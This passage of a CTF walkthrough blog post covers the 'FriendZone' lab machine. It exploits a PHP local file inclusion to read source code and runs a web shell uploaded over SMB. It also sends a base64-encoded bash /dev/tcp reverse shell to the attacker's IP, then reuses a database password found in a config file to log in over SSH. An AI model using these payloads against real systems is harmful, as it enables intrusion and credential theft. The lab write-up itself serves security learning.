class="SemanticString"> resulted in this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78050a63def3aa335b9d9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_login.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_login.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f78034998bf4aec55df659" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll retrieve the encoded source code using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.php.net/manual/en/wrappers.php.php">PHP wrappers</a></span><span class="SemanticString">. Doing </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pagename=php://filter/convert.base64-encode/resource=dashboard</code></span><span class="SemanticString"> returned a long base64 string.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780e9865dc6a57ae62462" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll get the page’s source code using PHP filters</span></span></p></div><div id="https://www.notion.so/2b40b98a88f7802e9597c649c25463cf" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_filter.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_filter.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7800e8a40f33bba271730" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When decoded, I get the source code:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7802dab40c995154a9f46" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">//echo "&lt;center>&lt;h2>Smart photo script for friendzone corp !&lt;/h2>&lt;/center>";</span>
+<span class="token comment">//echo "&lt;center>&lt;h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3>&lt;/center>";</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;title>FriendZone Admin !&lt;/title>"</span><span class="token punctuation">;</span>
+<span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"FriendZoneAuth"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h2>Smart photo script for friendzone corp !&lt;/h2>&lt;/center>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3>&lt;/center>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>image_name param is missed !&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>please enter it to show the image&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>default is image_id=a.jpg&amp;pagename=timestamp&lt;/p>&lt;/center>"</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+ <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image_id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;img src='images/<span class="token interpolation"><span class="token variable">$image</span></span>'>&lt;/center>"</span><span class="token punctuation">;</span>
+
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;h1>Something went worng ! , the script include wrong param !&lt;/h1>&lt;/center>"</span><span class="token punctuation">;</span>
+ <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pagename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token comment">//echo $_GET["pagename"];</span>
+ <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center>&lt;p>You can't see the content ! , please login !&lt;/center>&lt;/p>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?></span></span></span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780ee84edef19a98b84b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The vulnerable line is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">include($_GET[&quot;pagename&quot;].&quot;.php&quot;);</code></span><span class="SemanticString">. As suspected, it adds the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.php</code></span><span class="SemanticString"> extension to the user input and directly includes the file in the page output.</span></span></p></div><div id="https://www.notion.so/2ab0b98a88f780b3810cc362428daecc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f78095b293d0dd616f26aa" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f78095b293d0dd616f26aa"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Remote File Inclusion (Fail):</span></span></h3><div id="https://www.notion.so/2b40b98a88f78074b332e803c6d2bf2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it’s not prepending anything to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pagename</code></span><span class="SemanticString">, it may be possible for remote file inclusion as well.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f7808d98deecff549c6abd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve created a simple web shell and started an HTTP server to host it.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780a99210f15fe098c42b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f7807d9443d40f6c2ad4c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=http://10.10.14.66/shell.php&amp;cmd=id</code></span><span class="SemanticString"> </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">should</em></span><span class="SemanticString"> include my web shell and execute the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id</code></span><span class="SemanticString"> command, but no output appeared at the bottom</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780d98484c556b909d363" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_rfi.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_lfi_rfi.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7806a81afe0c587b88ffd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s no hit on my HTTP server either:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780329321f23664ad6297" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f7803d8becffe4c52799ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve also tried hosting the web shell in an SMB share, and referenced it in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pagename</code></span><span class="SemanticString"> via a UNC path, but nothing happened as well.  </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include">allow_url_include</a></span><span class="SemanticString"> is likely disabled on the server.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f780b497c4d6bde39adafd" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780b497c4d6bde39adafd"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">SMB Upload:</span></span></h3><div id="https://www.notion.so/2b40b98a88f780c299adc00058f9230c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This actually reminded me that I have write access to one of the SMB shares. I’ll upload the web shell to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Development</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7808ba5aaeb90302730d1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -N \\\\friendzone.red\\Development                             
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> put shell.php
+
+putting file shell.php as \shell.php (0.0 kb/s) (average 0.0 kb/s)</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f7802998e2fbde42f6f3be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the SMB enumeration earlier, the server path for the share is likely </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/Development</code></span><span class="SemanticString">, so I can reference the webshell via its full path. Visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell&amp;cmd=id</code></span><span class="SemanticString"> results in this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780d2bed6e3efe8214090" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_webshell.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_webshell.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ab0b98a88f780529389cd5202c440e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">That’s code execution!</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780608debfcf38aed896b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll now get a proper reverse shell. When executing over a web shell, I always prefer using base64-encoded payloads, as it avoids a lot of bad characters:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780c5986fde4f0a322fca" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> echo -n &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.66/8001 0&gt;&amp;1&#x27; | base64
+
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY2LzgwMDEgMD4mMQ==</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f7804ead2ad50ba2f4ce59" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll visit:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780d2bc2eea5273b7be1a" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell&amp;cmd=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY2LzgwMDEgMD4mMQ==%20|%20base64%20-d%20|%20bash</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f7809da981eaf35f3fb5e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page hangs, but on my listener, there’s a shell:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780858a78e54531eadcbd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.66] from (UNKNOWN) [10.129.26.47] 58898
+bash: cannot set terminal process group (765): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@FriendZone:/var/www/admin$</span></mark></span><span class="SemanticString"><span> id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f780e29e01f94020425713" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2aa0b98a88f7818e90c3ca60ce26cd7f" class="Divider"></div><h2 id="https://www.notion.so/2aa0b98a88f78194bb5ccc9d4e78d30d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2aa0b98a88f78194bb5ccc9d4e78d30d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Escalation from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/2ab0b98a88f78029aee1c982a60730bc" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f78029aee1c982a60730bc"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Web Folder:</span></span></h3><pre id="https://www.notion.so/2ab0b98a88f7807794baeb41cc8b1674" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@FriendZone:/var/www$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 36
+drwxr-xr-x  8 root root 4096 Sep 13  2022 .
+drwxr-xr-x 12 root root 4096 Sep 13  2022 ..
+drwxr-xr-x  3 root root 4096 Sep 13  2022 admin
+drwxr-xr-x  4 root root 4096 Sep 13  2022 friendzone
+drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportal
+drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Sep 13  2022 html
+-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
+drwxr-xr-x  3 root root 4096 Sep 13  2022 uploads</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780369aacd59b8a3e8d0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has lots of folders, each belonging to a subdomain. Most of them are empty or contain nothing useful.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780489f87f9751d528f95" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mysql_data.conf</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f7805d9c85d572cecc8501" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f7803a8e61c756810fb7eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Database creds are present, but MySQL is not running on the box.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780c887a6f6da1189326f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@FriendZone:/var/www$</span></mark></span><span class="SemanticString"><span> netstat -tulnp
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 10.129.26.47:53         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
+tcp6       0      0 :::443                  :::*                    LISTEN      -                   
+tcp6       0      0 :::445                  :::*                    LISTEN      -                   
+tcp6       0      0 :::139                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+udp    29952      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp     2240      0 10.129.26.47:53         0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:53            0.0.0.0:*                           -                   
+udp    20928      0 0.0.0.0:68              0.0.0.0:*                           -                   
+udp     6144      0 10.129.255.255:137      0.0.0.0:*                           -                   
+udp     4608      0 10.129.26.47:137        0.0.0.0:*                           -                   
+udp     6144      0 0.0.0.0:137             0.0.0.0:*                           -                   
+udp     1280      0 10.129.255.255:138      0.0.0.0:*                           -                   
+udp     7744      0 10.129.26.47:138        0.0.0.0:*                           -                   
+udp     1280      0 0.0.0.0:138             0.0.0.0:*                           -</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f78005a8e8d3c991c81a8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, there’s a user called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friend</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780ff9f29f436a4b13ad1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@FriendZone:/var/www$</span></mark></span><span class="SemanticString"><span> cat /etc/passwd | grep -v nologin | grep -v false
+
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+friend:x:1000:1000:friend,,,:/home/friend:/bin/bash</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780b1b7bef451042fb197" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And the creds can be reused over SSH.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780b995dbff69700b10c5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> ssh friend@friendzone.red
+
+Warning: Permanently added &#x27;friendzone.red&#x27; (ED25519) to the list of known hosts.
+friend@friendzone.red&#x27;s password: 
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+You have mail.
+Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span></span></span></code></pre><h3 id="https://www.notion.so/2ab0b98a88f780008c20c59d35e2a195" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780008c20c59d35e2a195"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">User Flag:</span></span></h3><pre id="https://www.notion.so/2ab0b98a88f78028bf13da783a91d93a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>friend@FriendZone:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+85f7a897************************</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f780f3b915d10fc1f3e999" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f780a4af10e484b40c0a13" class="Divider"></div><h2 id="https://www.notion.so/2ab0b98a88f780baab1afc57d812c30f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780baab1afc57d812c30f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Escalation from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friend</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/2ab0b98a88f780cc9fb9eb02c2fbeabe" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780cc9fb9eb02c2fbeabe"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 